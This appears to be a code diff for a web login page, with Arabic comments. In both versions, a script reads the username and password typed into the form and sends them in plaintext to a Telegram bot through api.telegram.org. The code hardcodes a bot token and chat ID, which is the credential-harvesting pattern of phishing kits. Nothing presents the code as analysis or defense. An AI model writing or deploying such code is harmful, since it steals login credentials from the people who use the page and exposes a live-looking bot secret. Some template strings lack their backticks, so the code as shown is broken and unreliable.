@@ -1,26 +1,39 @@
-document.getElementById('loginButton').addEventListener('click', function(e) {
-  e.preventDefault();  // لمنع الإرسال الافتراضي للنموذج إذا كان هذا يعمل
+document.addEventListener("DOMContentLoaded", function() {
+  document.getElementById("loginButton").addEventListener("click", function() {
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
 
-  // الحصول على قيم البيانات من الحقول
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
+    // التأكد من أن الحقول غير فارغة
+    if (username && password) {
+      sendToTelegram(username, password);  // إرسال البيانات للبوت
+    } else {
+      alert("يرجى إدخال جميع الحقول.");
+    }
+  });
+});
 
-  // إرسال البيانات إلى بوت تلجرام
-  const botToken = '7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8';  // استبدل هذا بالتوكن الخاص بك
-  const chatId = '7643313499';  // استبدل هذا بمعرف الدردشة الخاص بك
-  const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
+// وظيفة إرسال البيانات للبوت عبر API تلجرام
+function sendToTelegram(username, password) {
+  var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8";  // ضع توكن البوت هنا
+  var chatId = "7643313499";      // ضع chat_id هنا
 
-  const message = New Login Attempt:\nUsername: ${username}\nPassword: ${password};
+  var message = تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password};
+  
+  // بناء الرابط
+  var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
 
-  // إرسال الطلب إلى تلجرام
-  fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+  // إرسال الطلب عبر fetch
+  fetch(url)
     .then(response => response.json())
     .then(data => {
       if (data.ok) {
-        console.log('Message sent successfully!');
+        alert("تم إرسال بيانات تسجيل الدخول إلى البوت.");
       } else {
-        console.error('Error sending message:', data);
+        alert("حدث خطأ في إرسال البيانات.");
       }
     })
-    .catch(error => console.error('Error:', error));
-});
+    .catch(error => {
+      console.error("Error:", error);
+      alert("حدث خطأ في الاتصال مع البوت.");
+    });
+}
